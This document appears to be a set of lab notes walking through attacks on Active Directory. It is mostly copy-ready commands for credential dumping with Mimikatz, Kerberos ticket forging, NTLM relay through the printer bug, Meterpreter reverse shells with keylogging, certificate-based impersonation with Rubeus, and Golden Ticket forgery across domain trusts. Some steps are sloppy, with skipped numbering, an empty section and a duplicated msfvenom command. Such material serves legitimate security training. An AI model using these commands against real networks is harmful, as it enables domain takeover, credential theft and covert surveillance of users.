# Tools

- `Bloodhound`
- `PowerSploit`
- `PowerView`
- `Mimikatz`
- `ntlmrelayx.py`
- `SpoolSample.exe`

# Exploiting Permission Delegation

Permission Delegation exploits are often referred to as ACL-based attacks. AD allows administrators to configure Access Control Entries (ACEs) that populates Discretionary Access Control Lists (DACLs), hence the name ACL-based attacks. Almost any AD object can be secured with ACEs, which then describe the allowed and denied permissions that any other AD object has against the target object.

Misconfigured ACEs:

- **ForceChangePassword**: We have the ability to set the user's current password without knowing their current password.
- **AddMembers**: We have the ability to add users (including our own account), groups or computers to the target group.
- **GenericAll**: We have complete control over the object, including the ability to change the user's password, register an SPN or add an AD object to the target group.
- **GenericWrite**: We can update any non-protected parameters of our target object. This could allow us to, for example, update the scriptPath parameter, which would cause a script to execute the next time the user logs onn
- **WriteOwner**: We have the ability to update the owner of the target object. We could make ourselves the owner, allowing us to gain additional permissions over the object.
- **WriteDACL**: We have the ability to write new ACEs to the target object's DACL. We could, for example, write an ACE that grants our account full control over the target object.
- **AllExtendedRights**: We have the ability to perform any action associated with extended AD rights against the target object. This includes, for example, the ability to force change a user's password.

## Exploiting ACE using Bloodhound:

Steps taken to establish a backdoor:

1.  Enumerate the AD using bloodhound.
2.  Find paths of privilege escalation.
3.  Add your compormised AD account to the vulnerable group

```PowerShell
PS C:\>Add-ADGroupMember "VULNERABLE_GROUP" -Members "Your.AD.Account.Username"
```

4.  Try out the vulnerable ACEs.

## Exploiting ACE using PowerSploit:

# Exploiting Kerberos Delegation

## Constrained VS Unconstrained

There are two types of Kerberos Delegation. In the original implementation of Kerberos Delegation, Unconstrained Delegation was used, which is the least secure method. In essence, Unconstrained Delegation provides no limits to the delegation. In the background, if a user with the "TRUSTED_FOR_DELEGATION" flag set authenticates to a host with Unconstrained Delegation configured, a ticket-granting ticket (TGT) for that user account is generated and stored in memory so it can be used later if needed. Suppose an attacker can compromise a host that has Unconstrained Delegation enabled. In that case, they could attempt to force a privileged account to authenticate to the host, which would allow them to intercept the generated TGT and impersonate the privileged service.

### Constrained Delegation Exploitation

1. Enumerate available delegations

```PowerShell
PS C:\>Import-Module C:\Tools\PowerView.ps1
PS C:\>Get-NetUser -TrustedToAuth
```

2. Use the compormised service to dump LSASecrets, part of the Windows Registry Hive where credentials are stored for features such as Windows services.
3. Use Mimikatz to dump the secrets

```PowerShell
C:\> C:\Tools\mimikatz_trunk\x64\mimikatz.exe
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

**token::elevate** - To dump the secrets from the registry hive, we need to impersonate the SYSTEM user.
**lsadump::secrets** - Mimikatz interacts with the registry hive to pull the clear text credentials.

4. We can perform a Kerberos delegation attack by using a combination of Kekeo and Mimikatz. You can use another window for Mimikatz, but make sure to exit out of Mimikatz after the `token::elevate` command, otherwise the tickets will be loaded in the wrong context later on. We will use Kekeo to generate our tickets and then use Mimikatz to load those tickets into memory. Let's start by generating the tickets:

```PowerShell
PS C:\> C:\Tools\kekeo\x64\kekeo.exe
```

6. We first need to generate a TGT that can be used to generate tickets for the HTTP and WSMAN services.

```PowerShell
kekeo # tgt::ask /user:svcIIS /domain:<DOMAIN>.loc /password:redacted
```

7. Forge TGS requests for the account we want to impersonate. We need to perform this for both HTTP and WSMAN to allow us to create a PSSession.

```PowerShell
kekeo # tgs::s4u /tgt:TGT_svcIIS@<DOMAIN>.LOC_krbtgt~<DOMAIN.loc@<DOMAIN.LOC.kirbi /user:<COMPROMISED_USER> /service:http/<MACHINE_NAME>.<DOMAIN>.loc
```

8. Run the command again, this time for the WSMAN service.

```PowerShell
kekeo # tgs::s4u /tgt:TGT_svcIIS@<DOMAIN.LOC_krbtgt~<DOMAIN>.loc@<DOMAIN.LOC.kirbi /user:<COMPROMISED_USER> /service:wsman/<MACHINE_NAME>.<DOMAIN>.loc
```

10. Now that we have the two TGS tickets, we can use Mimikatz to import them.

```PowerShell
mimikatz # privilege::debug
mimikatz # kerberos::ptt <COMPROMISED_USER>@<DOMAIN>.LOC_wsman~<MACHINE_NAME>.<DOMAIN>.loc@<DOMAIN>.LOC.kirbi
mimikatz # kerberos::ptt <COMPROMISED_USER>@<DOMAIN>.LOC_http~<MACHINE_NAME>.<DOMAIN>.loc@<DOMAIN>.LOC.kirbi
```

12. Exit Mimikatz and run `klist` if you want to verify that the tickets were imported.

```PowerShell
mimikatz # exit
PS C:> New-PSSession -ComputerName <MACHINE_NAME>.<DOMAIN>.loc
```

14. Create our PSSession

```PowerShell
PS C:\> Enter-PSSession -ComputerName <MACHINE_NAME>.<DOMAIN>.loc
```

# Exploiting Automated Relays

1. Find an admin machine using bloodhoud. Click the "Create Custom Query" in the Analysis tab in Bloodhound:

```SQL
MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p
```

For arguments sake we will assume `SERVER_MACHINE_1` is `admiTo` `SERVER_MACHINE_2`.

2. Exploit a bug on the admin computer.

## Exploiting the printer bug

To Exploit this but we would need the following:

- A valid set of AD account credentials.
- Network connectivity to the target's SMB service.
- The target host must be running the Print Spooler service.
- The hosts must not have SMB signing enforced.

1. Determine if the `Print Spooler` service is running. Since we don't have access to `SERVER_MACHINE`, we need to query from the network perspective. We can use a `WMI query` from our SSH session on `COMPROMISED_MACHINE` to query the service's current state:

```PowerShell
PS C:\> WMIC Win32_Printer -Computer SERVER_MACHINE_2.DOMAIN
```

2. If access denied try powerShell cmdlet

```PowerShell
PS C:\> Get-PrinterPort -ComputerName SERVER_MACHINE_1.DOMAIN SERVER_MACHINE_2.DOMAIN
```

3. Verify that SERVER_MACHINE do not have SMB signing enforced, by using Nmap on our AttackBox:

```cmd
nmap --script=smb2-security-mode -p445 SERVER_MACHINE.DOMAIN

Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
```

4. Set up the NTLM relay. On our AttackBox, we can use the following:

```cmd
python3.9 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://"SERVER_MACHINE_1_IP" -debug
```

5. In an SSH terminal on COMPROMISED_MACHINE, execute the following:

```PowerShell
C:\Tools\>SpoolSample.exe SERVER_MACHINE_2.DOMAIN "Attacker IP"
```

6. Your attacker IP should correspond with your tunX interface for the network. If all goes well, you should have received an authentication attempt and a relay to SERVER_MACHINE_1

```cmd
python3.9 ntlmrelayx.py -smb2support -t smb://"THMSERVER1 IP" -c 'whoami /all' -debug
```

# Exploiting AD Users

- **Credential Management** - How users store their credentials. In AD, this is quite important since users may have multiple sets of credentials and remembering all of them can be a hassle.

```
Search for `.kdbx.` file and download to attack machine using meterpreter.
```

- **Keylogging** - Often, during exploitation, we need to understand how normal users interact with a system. Together with screengrabs, Keylogging can be a useful tool to gain this understanding from an attacker's perspective.

1. Use meterpreter to get a keylogger to the VICTIM_MACHINE

```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1
```

2. Create a reverse shell

```cmd
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT="Listening port" -f psh -o shell.ps1

sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT "listening port'; exploit"
```

You can host your meterpreter shell using a Python webserver and then copy it using something like this:

```cmd
certutil.exe -urlcache -split -f http:///shell.ps1
```

3. The first is to check if the user has any running processes on the machine

```cmd
meterpreter\>ps | grep "explorer"
```

4. Use the process ID to migrate to the following session

```cmd
meterpreter\>migrate 3612
```

5. Confirm if you are running as the target

```cmd
meterpreter\>getuid
```

6. Start your keylogger

```cmd
meterpreter\>keyscan_start
```

7. After waiting for a while dump the log

```cmd
meterpreter\>keyscan_dump
```

# Exploiting Certificates

AD Certificate Services (CS) is Microsoft's Public Key Infrastructure (PKI) implementation. Since AD provides a level of trust in an organisation, it can be used as a CA to prove and delegate trust. AD CS is used for several things, such as encrypting file systems, creating and verifying digital signatures, and even user authentication, making it a promising avenue for attackers.

## Find vulnerable certificate templates using `certutil`

We can use the following command to look through vulnerable certificates:

```PowerShell
C:\>certutil -Template -v > templates.txt
```

## Exploiting a Certificate Template

1. Open MMC:
   - Click Start -> rum
   - Type mmc and hit enter
   - Click File->Add/Remove Snap-in
   - Add the Certificates snap-in and make sure to select Computer Account and Local computer on the prompts
   - Click OK
2. We will now request for a personal certificate
   - Right Click on Personal and select All Tasks->Request New Certificate...
   - Click Next twice to select the AD enrollment policy.
   - You will see that we have one template that we can request, but first, we need to provide additional information.
   - Click on the More Information warning.
   - Change the Subject name Type option to Common Name and provide any value, since it does not matter, and click Add.
   - Change the Alternative name Type option to User principal name.
   - Supply the UPN of the user you want to impersonate. The best would be a DA account such as Administrator@DOMAIN.loc and click Add.
3. Once you are happy with it, click Apply and OK. Then, select the certificate and click Enroll. You should be able to see your certificate:

4. The last step is to export our certificate with the private key:
   - Right-click on the certificate and select All Tasks->Export...
   - Click Next, select Yes, export the private key, and click Next.
   - Click Next, then set a password for the certificate since the private key cannot be exported without a password.
   - Click Next and select a location to store the certificate.
   - Click Next and finally click Finish.
5. Impersonate a user:
   - Use the certificate to request a Kerberos ticket-granting ticket (TGT)
   - Load the Kerberos TGT into your hacking platform of choice
6. Use `Rubeus` to receive a TGT, using the following template:

```cmd
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate: /password: /outfile: /domain:DOMAIN /dc:
```

```PowerShell
C:\Tools> .\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:vulncert.pfx /password:<PASSWORD> /outfile:administrator.kirbi /domain:<DOMAIN>.loc /dc:<DOMAIN_IP>
```

7. Now we can use Mimikatz to load the TGT and authenticate to DC:

```PowerShell
C:\Tools>mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::ptt administrator.kirbi
mimikatz # exit

C:\Tools>dir \\<DC>.<DOMAIN>.loc\c$\
```

# Exploiting Domain Trust

## Golden Ticket Attack

In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:

- The FQDN of the domain
- The Security Identifier (SID) of the domain
- The username of the account we want to impersonate
- The KRBTGT password hash (Can be obtained through Domain Compormize)

1.  Use Mimikatz with a DC Sync to recover the KRBTGT password hash:

```PowerShell
C:\Tools>mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # lsadump::dcsync /user:za\krbtgt
```

2. Now that we obtianed the Hash we can use the KRBTGT password hash, we could now forge a Golden Ticket to access any resource in the child domain.

3. We can go a step further by forging an Inter-realm TGT. Inter-Realm TGTs are used to provide access to resources in other domains.

The key here is that we will exploit the trust the parent domain has with our child domain by adding the SID of the Enterprise Admins (EA) group as an extra SID to our forged ticket for the domain controller of the child domain. The EA group belongs to the parent domain and membership to this group essentially grants Administrative privileges over the entire forest! The default SID for this group is `S-1-5-21-<RootDomain>-519`.

4. We first need to recover two SIDs:

   - The SID of the child domain controller (DC), which we will impersonate in our forged TGT
   - The SID of the Enterprise Admins in the parent domain, which we will add as an extra SID to our forged TGT

5. To recover these SIDs, we can use the AD-RSAT Powershell cmdlets. We can recover the SID of the child domain controller using the following command:

```PowerShell
PS C:\> Get-ADComputer -Identity "<CHILD_DOMAIN>"
```

6. We can recover the SID of the Enterprise Admins group using the following command to query the parent domain controller:

```PowerShell
PS C:\> Get-ADGroup -Identity "Enterprise Admins" -Server <ROOT_DOMAIN>.loc
```

7. We finally have all of the information required to create our forged TGT. We will use Mimikatz to generate this golden ticket. The command will look something like this:

```PowerShell
C:\Tools>mimikatz_trunk\x64\mimikatz.exe
mimikatz # privilege::debug
mimikatz # kerberos::golden /user:Administrator /domain:<DOMAIN>.loc /sid:<SID> /service:krbtgt /rc4:<Password hash of krbtgt user> /sids:<SID of Enterprise Admins group> /ptt
```

8. First, we will verify that this ticket works for access to DC since it is a valid ticket for the Administrator user of the child domain:

```PowerShell
C:\>dir \\<DC><DOMAIN>.loc\c$
```

9. This at least confirms that the Golden Ticket was forged for access to the child DC. However, since we specified extra SIDs, we should also now have access to the parent DC:

```PowerShell
C:\>dir \\<ROOT_DC>.<DOMAIN>.loc\c$\
```
